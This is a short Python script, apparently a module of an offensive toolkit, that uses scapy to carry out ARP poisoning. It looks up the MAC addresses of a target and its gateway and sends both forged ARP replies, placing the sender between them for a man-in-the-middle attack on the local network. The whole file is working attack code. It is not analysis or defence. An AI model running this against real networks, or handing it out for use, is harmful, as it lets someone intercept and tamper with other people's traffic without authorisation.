from scapy.all import *
import time

def run(target_ip, gateway_ip, interface="eth0"):
    print(f"[+] Starting ARP Poisoning on target {target_ip} via gateway {gateway_ip}")
    
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac or not gateway_mac:
        return "[!] Could not retrieve MAC addresses."

    target_arp = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    try:
        for _ in range(5):  # Send a few packets for demonstration
            send(target_arp, verbose=0, iface=interface)
            send(gateway_arp, verbose=0, iface=interface)
            time.sleep(2)
        return "[+] ARP Poisoning packets sent."
    except Exception as e:
        return f"[!] Error: {e}"

